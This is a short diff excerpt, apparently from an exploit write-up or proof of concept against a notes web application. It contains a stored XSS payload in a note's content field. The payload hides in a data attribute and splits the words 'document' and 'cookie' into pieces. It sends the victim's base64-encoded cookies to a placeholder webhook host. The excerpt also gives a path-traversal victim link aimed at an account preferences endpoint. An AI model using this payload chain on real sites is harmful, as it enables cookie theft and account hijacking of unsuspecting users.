@@ -105,6 +105,7 @@ POST /api/notes
   "title": "test",
   "content": "<div id=\"enhance-config\" data-types=\"custom\"><span data-enhance=\"custom\" data-cfg=\"new Image().src='https://WEBHOOK?c='+btoa(top['docu'+'ment']['coo'+'kie'])\"></span></div>"
 }
+
 Step 3: Send victim link
 /note/NOTE_ID/..%2F..%2Fapi%2Faccount%2Fpreferences%2Freader-presets%2Fevil
 
